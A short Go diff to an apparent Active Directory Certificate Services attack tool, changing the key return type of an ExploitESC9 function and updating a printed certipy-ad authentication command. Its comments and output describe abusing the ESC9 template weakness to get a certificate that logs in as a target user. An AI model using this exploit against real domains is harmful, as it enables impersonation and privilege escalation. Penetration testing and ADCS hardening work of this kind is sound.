@@ -1,7 +1,7 @@
 package pki
 
 import (
-	"crypto/ecdsa"
+	"crypto"
 	"crypto/x509"
 	"fmt"
 	"strings"
@@ -145,7 +145,7 @@ func ScanESC9(cfg *ADCSConfig) ([]ESC9Finding, error) {
 // based solely on the UPN in the SAN — which is the target's UPN.
 //
 // Requires: write access to the attacker's own userPrincipalName attribute.
-func ExploitESC9(cfg *ADCSConfig, templateName, attackerDN, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ExploitESC9(cfg *ADCSConfig, templateName, attackerDN, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] ESC9 Exploitation: template=%s attacker=%s target=%s\n", templateName, attackerDN, targetUPN)
 
 	// Step 0: Verify template is ESC9 vulnerable
@@ -256,7 +256,7 @@ func ExploitESC9(cfg *ADCSConfig, templateName, attackerDN, targetUPN string) (*
 	fmt.Printf("[*] The certificate lacks szOID_NTDS_CA_SECURITY_EXT (no requester SID)\n")
 	fmt.Printf("[*] With StrongCertificateBindingEnforcement < 2, this cert authenticates as %s\n", targetUPN)
 	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy auth -pfx %s.pfx -dc-ip %s\n", upnUser, cfg.TargetDC)
+	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
 
 	return cert, certKey, nil
 }
